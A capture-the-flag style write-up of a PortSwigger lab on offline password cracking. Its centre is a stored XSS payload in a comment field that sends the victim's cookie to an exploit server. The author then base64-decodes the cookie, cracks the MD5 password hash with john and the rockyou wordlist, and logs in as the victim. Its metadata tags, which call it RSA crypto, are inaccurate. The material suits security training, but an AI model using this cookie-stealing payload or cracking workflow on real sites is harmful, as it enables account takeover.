---
title: "auth 10 - portswigger labs"
category: "crypto"
subcategory: "rsa"
type: "writeup"
tags: ["crypto", "wiener", "xss", "burp", "base64", "wordlists"]
summary: "crypto writeup for \"auth 10\" from portswigger labs - techniques: wiener, xss, burp, base64, wordlists."
source:
  name: "siunam321.github.io"
  url: "https://siunam321.github.io/ctf/portswigger-labs/Authentication/auth-10/"
original_source:
  name: "siunam321/siunam321.github.io"
  url: "https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/Authentication/auth-10/README.md"
ctf:
  name: "portswigger labs"
  challenge: "auth 10"
---

## Source

- **CTF:** portswigger labs
- **Challenge:** auth 10
- **Author:** [siunam321](https://siunam321.github.io/)
- **Writeup:** <https://siunam321.github.io/ctf/portswigger-labs/Authentication/auth-10/>
- **Source file:** <https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/Authentication/auth-10/README.md>

---
# Offline password cracking | Dec 22, 2022

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking), you'll learn: Offline password cracking! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`

## Exploitation

**Login page:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-10/images/Pasted%20image%2020221222041553.png)

**Login as user `wiener`:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-10/images/Pasted%20image%2020221222041609.png)

**Burp Suite HTTP history:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-10/images/Pasted%20image%2020221222042132.png)

As you can see, we have a new cookie called `stay-logged-in`.

**In the previous lab, we found that this cookie is encoded in base64, and the format is `<username>:<MD5_password_hash>`:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# echo "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw" | base64 -d 
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

**Home page:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-10/images/Pasted%20image%2020221222041632.png)

**Let's look at one of those posts:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-10/images/Pasted%20image%2020221222041746.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-10/images/Pasted%20image%2020221222041756.png)

In the bottom of the post, users can leave a comment.

**Let's try to trigger a XSS payload:**
```html
</textarea><script>alert(document.domain)</script>
```

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-10/images/Pasted%20image%2020221222041936.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-10/images/Pasted%20image%2020221222041951.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-10/images/Pasted%20image%2020221222042027.png)

**Can confirm the `Comment` field is vulnerable to stored XSS.**

**Armed with above information, we can steal users' cookies via the `exploit server`!**
```html
</textarea><script>document.location="https://exploit-0a5a00bf04bcabbec18d021e016f00be.exploit-server.net/exploit?" + document.cookie</script>
```

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-10/images/Pasted%20image%2020221222042504.png)

**Exploit server access log:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-10/images/Pasted%20image%2020221222042639.png)

`stay-logged-in` cookie value: `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`

**Nice! Let's base64 decode that:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# echo "Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz" | base64 -d
carlos:26323c16d5f4dabff3bb136f2460a943
```

**Now, we can use `john` the crack the MD5 hashed password:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# echo -n "carlos:26323c16d5f4dabff3bb136f2460a943" > carlos.hash

┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 carlos.hash
[...]
onceuponatime    (carlos)     
[...]
```

- Found `carlos`'s password: `onceuponatime`

**Let's login as user `carlos`!**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-10/images/Pasted%20image%2020221222042956.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-10/images/Pasted%20image%2020221222043003.png)

And delete it!

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-10/images/Pasted%20image%2020221222043022.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-10/images/Pasted%20image%2020221222043029.png)

We did it!

# What we've learned:

1. Offline password cracking
